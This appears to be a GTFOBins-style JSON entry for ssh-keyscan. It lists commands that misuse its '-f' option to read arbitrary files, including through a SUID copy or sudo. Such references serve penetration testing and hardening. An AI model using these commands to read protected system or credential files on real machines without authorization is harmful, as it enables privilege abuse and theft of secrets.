{
  "functions": {
    "file-read": [
      {
        
        "code": "LFILE=file_to_read\nssh-keyscan -f $LFILE\n"
      }
    ],
    "suid": [
      {
        
        "code": "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
      }
    ],
    "sudo": [
      {
        
        "code": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
      }
    ]
  }
}
